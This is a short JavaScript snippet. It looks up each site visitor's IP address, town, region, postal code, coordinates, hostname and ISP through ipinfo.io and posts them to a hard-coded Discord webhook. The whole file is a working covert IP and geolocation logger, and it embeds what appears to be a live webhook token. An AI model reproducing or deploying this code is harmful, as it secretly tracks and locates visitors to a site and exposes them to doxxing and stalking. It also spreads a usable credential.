$.getJSON("https://ipinfo.io/json", function(data) {         
  var params = {
    embeds: [
      {
        "title": "Someone visited your site!",
        "color": 1525870,
        "thumbnail": {
        },
        "fields": [
          {
            "name": "IP Address",
            "value": `> ${data.ip}`
          },
          {
            "name": "GeoLocation Info",
            "value": `>>> Town, State: ${data.city}, ${data.region}\nCountry: ${data.country}\nPostal Code: ${data.postal}\nTimeZone: ${(data.timezone).replace('_', ' ')}\nLong/Lat: ${data.loc}`
          },
          {
            "name": "Network Info",
            "value": `>>> HostName: ${data.hostname}\nISP: ${data.org}\n`
          }
        ]
      }
    ]
  }
  fetch('https://discord.com/api/webhooks/1188236792080638052/aRiZ_8dSV5Un9pvmT-p9tUndFxsvPwYRe8yuaE7QTa4qZJ713PhxT1yRm4R_VCYgdbwZ', {
    method: "POST",
    headers: {
        'Content-type': 'application/json'
    },
    body: JSON.stringify(params)
  }).then(res => {
    console.log(res);
  }) 
})